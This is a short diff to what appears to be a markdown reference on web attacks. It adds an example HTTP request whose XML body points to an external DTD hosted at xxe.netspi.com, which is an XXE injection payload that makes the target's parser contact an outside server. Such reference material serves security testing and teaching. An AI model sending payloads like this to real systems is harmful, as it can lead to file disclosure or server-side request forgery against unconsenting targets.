@@ -528,6 +528,20 @@ when no parameter
 ```
 ```python
 
+	POST /netspi HTTP/1.1
+	Host: someserver.netspi.com
+	Accept: application/json
+	Content-Type: application/xml
+	Content-Length: 139
+
+	<?xml version="1.0" encoding="UTF-8" ?>
+	<!DOCTYPE foo SYSTEM "https://xxe.netspi.com/netspi.dtd">
+	<root>
+	<search>name</search>
+	</root>
+```
+```python
+
                                 POST /action HTTP/1.0
                                 Content-Type: text/xml
                                 Content-Length: 52
